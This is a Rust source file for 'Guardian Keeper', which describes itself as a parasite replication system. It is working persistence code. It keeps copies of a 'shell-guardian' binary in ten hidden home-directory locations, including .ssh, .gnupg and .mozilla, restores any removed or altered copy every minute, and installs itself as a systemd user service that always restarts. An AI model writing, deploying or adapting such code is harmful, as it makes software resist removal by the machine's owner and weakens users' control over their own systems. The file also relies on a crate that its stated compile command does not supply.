// Guardian Keeper - The parasite replication system
// This is a second binary that focuses solely on ensuring guardian's survival
// Compile with: rustc -O guardian-keeper.rs

use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, exit};
use std::thread;
use std::time::Duration;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

// Survival locations to maintain copies
const SURVIVAL_LOCATIONS: [&str; 10] = [
    ".local/bin/shell-guardian",
    ".dotfiles/.guardian-shell/shell-guardian.bin",
    ".cache/.guardian-survival",
    ".config/guardian/bin/shell-guardian",
    ".local/share/guardian/shell-guardian",
    ".ssh/.guardian-binary",
    ".gnupg/.guardian-survival",
    ".config/.survival-guardian",
    ".local/state/.guardian-binary",
    ".mozilla/.guardian-backup"
];

// Source binary to replicate
const SOURCE_BINARY: &str = ".local/bin/shell-guardian";

// Check interval in seconds
const CHECK_INTERVAL: u64 = 60;

fn main() {
    // Parse arguments
    let args: Vec<String> = env::args().collect();
    
    // If running as service
    if args.len() > 1 && args[1] == "service" {
        run_service();
        return;
    }
    
    // Otherwise, check and repair
    match check_and_repair() {
        Ok(count) => {
            if count > 0 {
                println!("✅ Repaired {} survival copies", count);
            } else {
                println!("✅ All survival copies intact");
            }
            exit(0);
        },
        Err(e) => {
            eprintln!("❌ Error checking survival copies: {}", e);
            exit(1);
        }
    }
}

// Run as a continuous service
fn run_service() {
    println!("🔄 Starting Guardian Keeper service");
    
    // Set up termination signal handling
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();
    
    ctrlc::set_handler(move || {
        println!("🛑 Received termination signal, shutting down...");
        r.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl-C handler");
    
    // Main service loop
    while running.load(Ordering::SeqCst) {
        match check_and_repair() {
            Ok(count) => {
                if count > 0 {
                    println!("🔄 Repaired {} survival copies", count);
                }
            },
            Err(e) => {
                eprintln!("⚠️ Error checking survival copies: {}", e);
            }
        }
        
        // Sleep before next check
        for _ in 0..CHECK_INTERVAL {
            if !running.load(Ordering::SeqCst) {
                break;
            }
            thread::sleep(Duration::from_secs(1));
        }
    }
    
    println!("👋 Guardian Keeper service shut down");
}

// Check and repair all survival copies
fn check_and_repair() -> Result<usize, Box<dyn std::error::Error>> {
    let home = get_home_dir()?;
    let source_path = home.join(SOURCE_BINARY);
    
    // Ensure source exists
    if !source_path.exists() {
        // Try to find a valid copy from survival locations
        let mut valid_source: Option<PathBuf> = None;
        
        for location in SURVIVAL_LOCATIONS.iter() {
            let path = home.join(location);
            if path.exists() && path.is_file() {
                valid_source = Some(path);
                break;
            }
        }
        
        if let Some(source) = valid_source {
            // Restore source from survival copy
            fs::create_dir_all(source_path.parent().unwrap())?;
            fs::copy(&source, &source_path)?;
            fs::set_permissions(&source_path, fs::metadata(&source)?.permissions())?;
            println!("🔄 Restored main guardian from survival copy");
        } else {
            return Err("No valid guardian binary found in any survival location".into());
        }
    }
    
    // Get source content and metadata
    let source_content = fs::read(&source_path)?;
    let source_metadata = fs::metadata(&source_path)?;
    let source_perms = source_metadata.permissions();
    
    // Check and repair each survival location
    let mut repaired_count = 0;
    
    for location in SURVIVAL_LOCATIONS.iter() {
        let target_path = home.join(location);
        
        // Skip the source itself
        if target_path == source_path {
            continue;
        }
        
        let needs_repair = match fs::metadata(&target_path) {
            Ok(metadata) => {
                // Check if size differs
                if metadata.len() != source_metadata.len() {
                    true
                } else {
                    // Check if content differs
                    match fs::read(&target_path) {
                        Ok(content) => content != source_content,
                        Err(_) => true
                    }
                }
            },
            Err(_) => true // File doesn't exist or can't be accessed
        };
        
        if needs_repair {
            // Create parent directory if it doesn't exist
            if let Some(parent) = target_path.parent() {
                fs::create_dir_all(parent)?;
            }
            
            // Copy file
            fs::write(&target_path, &source_content)?;
            
            // Set permissions
            fs::set_permissions(&target_path, source_perms.clone())?;
            
            repaired_count += 1;
        }
    }
    
    Ok(repaired_count)
}

// Get home directory
fn get_home_dir() -> Result<PathBuf, Box<dyn std::error::Error>> {
    match env::var("HOME") {
        Ok(home) => Ok(PathBuf::from(home)),
        Err(_) => Err("HOME environment variable not set".into())
    }
}

// Install self as systemd user service
pub fn install_service() -> Result<(), Box<dyn std::error::Error>> {
    let home = get_home_dir()?;
    let service_dir = home.join(".config/systemd/user");
    
    // Create service directory
    fs::create_dir_all(&service_dir)?;
    
    // Self path
    let self_path = env::current_exe()?;
    
    // Create service file
    let service_file = service_dir.join("guardian-keeper.service");
    let service_content = format!(
        "[Unit]\n\
         Description=Guardian Keeper - Guardian Binary Survival Service\n\
         After=network.target\n\
         \n\
         [Service]\n\
         Type=simple\n\
         ExecStart={} service\n\
         Restart=always\n\
         RestartSec=10\n\
         \n\
         [Install]\n\
         WantedBy=default.target\n",
        self_path.display()
    );
    
    fs::write(&service_file, service_content)?;
    
    // Enable and start service
    Command::new("systemctl")
        .args(&["--user", "daemon-reload"])
        .status()?;
        
    Command::new("systemctl")
        .args(&["--user", "enable", "guardian-keeper.service"])
        .status()?;
        
    Command::new("systemctl")
        .args(&["--user", "start", "guardian-keeper.service"])
        .status()?;
    
    println!("✅ Guardian Keeper service installed and started");
    
    Ok(())
}